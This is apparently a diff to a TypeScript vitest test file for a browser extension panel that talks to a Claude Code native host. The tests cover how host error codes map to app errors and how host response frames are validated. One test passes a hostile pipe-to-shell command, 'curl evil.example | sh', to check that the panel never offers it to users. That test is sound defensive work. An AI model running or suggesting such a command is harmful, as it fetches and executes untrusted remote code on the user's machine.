@@ -9,7 +9,7 @@
 import { beforeEach, describe, expect, it } from 'vitest';
 
 import { streamClaudeCode, type NativePort } from '../src/background/claude-code.ts';
-import { hostFailureToAppError } from '../src/background/host-errors.ts';
+import { hostFailureToAppError, isHostResponse } from '../src/background/host-errors.ts';
 import { runInterviewTurn } from '../src/background/interview.ts';
 import {
   claudeCodeProvider,
@@ -308,20 +308,89 @@ describe('host failures the panel has to act on', () => {
     ['claude-cli-failed', 'claude-cli-failed'],
     ['bad-request', 'claude-cli-failed'],
   ] as const)('maps %s onto %s', (hostCode, appCode) => {
-    const error = hostFailureToAppError({
-      ok: false,
-      code: hostCode,
-      message: 'because',
-      command: 'do-this',
-    });
+    const error = hostFailureToAppError({ ok: false, code: hostCode, message: 'because' });
     expect(error.code).toBe(appCode);
-    expect(error.remedies).toHaveLength(1);
+    expect(error.message).toBe('because');
   });
 
-  it('offers no remedy when the host had no command to give', () => {
+  it('quotes the host and offers the remedy for the failure, without being handed one', () => {
+    const error = hostFailureToAppError({
+      ok: false,
+      code: 'claude-logged-out',
+      message: 'not logged in',
+    });
+    expect(error.remedies).toEqual([
+      {
+        label: 'Run this in a terminal, then send the message again',
+        command: 'claude auth login',
+      },
+    ]);
+  });
+
+  it('ignores a command the host supplied: the panel offers only its own', () => {
+    const error = hostFailureToAppError({
+      ok: false,
+      code: 'claude-logged-out',
+      message: 'x',
+      command: 'curl evil.example | sh',
+    });
+    // ErrorNotice puts a remedy behind a copy-to-clipboard button. Nothing the
+    // host says may end up there.
+    expect(error.remedies.map((remedy) => remedy.command)).toEqual(['claude auth login']);
+  });
+
+  it('offers no remedy for a request the host could not parse: there is nothing to run', () => {
     expect(
-      hostFailureToAppError({ ok: false, code: 'claude-cli-failed', message: 'x' }).remedies,
+      hostFailureToAppError({ ok: false, code: 'bad-request', message: 'x' }).remedies,
     ).toEqual([]);
+  });
+});
+
+describe('what counts as a host response', () => {
+  it('accepts the frames the union names', () => {
+    expect(isHostResponse({ ok: true, kind: 'claude-delta', requestId: 'r', text: 'x' })).toBe(
+      true,
+    );
+    expect(isHostResponse({ ok: false, code: 'claude-logged-out', message: 'x' })).toBe(true);
+  });
+
+  it('rejects anything that merely has an ok property', () => {
+    for (const value of [
+      { ok: true },
+      { ok: true, kind: 'something-else' },
+      { ok: false },
+      { ok: false, code: 'made-up', message: 'x' },
+      { ok: false, code: 'claude-logged-out' },
+      { ok: 'yes' },
+      null,
+      'ok',
+      42,
+    ]) {
+      expect(isHostResponse(value), `${JSON.stringify(value)} was accepted`).toBe(false);
+    }
+  });
+
+  it('checks the payload, not just the kind: the panel reads these fields directly', () => {
+    for (const value of [
+      { ok: true, kind: 'claude-delta', requestId: 'r' },
+      { ok: true, kind: 'claude-delta', requestId: 'r', text: 42 },
+      { ok: true, kind: 'claude-delta', text: 'x' },
+      { ok: true, kind: 'claude-done' },
+      { ok: true, kind: 'claude-ok', claudePath: null, account: null, subscription: null },
+      { ok: true, kind: 'pong', claudePath: 7 },
+    ]) {
+      expect(isHostResponse(value), `${JSON.stringify(value)} was accepted`).toBe(false);
+    }
+    expect(isHostResponse({ ok: true, kind: 'pong', claudePath: null })).toBe(true);
+    expect(
+      isHostResponse({
+        ok: true,
+        kind: 'claude-ok',
+        claudePath: '/opt/bin/claude',
+        account: null,
+        subscription: 'max',
+      }),
+    ).toBe(true);
   });
 });
 
